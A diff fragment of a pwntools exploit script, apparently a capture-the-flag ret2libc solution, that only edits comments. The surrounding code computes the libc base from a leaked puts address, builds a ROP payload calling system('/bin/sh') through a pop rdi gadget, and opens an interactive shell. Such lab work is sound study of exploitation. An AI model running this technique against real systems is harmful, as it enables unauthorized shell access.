@@ -364,7 +364,7 @@ libc_puts = 0x06f690
 libc_binsh = 0x18cd17
 libc_system = 0x045390
 
-libc_base = puts_leak - libc_puts # calculate addr base
+libc_base = puts_leak - libc_puts # calculate addr base libc
 log.info('libc base at ' + hex(libc_base))
 
 addr_system = libc_base + libc_system # calculate difference between base and system function
@@ -374,13 +374,13 @@ binsh = libc_base + libc_binsh # calculate difference between base and /bin/sh
 log.info('System at ' + hex(addr_system))
 log.info('/bin/sh at ' + hex(binsh))
 
-p.recvuntil('ROP me outside, how \'about dah?\n') # wait str to send pld
+p.recvuntil('ROP me outside, how \'about dah?\n') # wait str to send payload
 
 pld = b''
 pld += padding # offset to go save RIP 
 pld += p64(gadget) # gadget to pass a parameter to called function (pop rdi ; ret)
-pld += p64(binsh) # 
-pld += p64(addr_system)
+pld += p64(binsh) # parameter system
+pld += p64(addr_system) # system in libc leaked 
 
 p.sendline(pld) # send payload 
 p.interactive() # spawn interactive shell
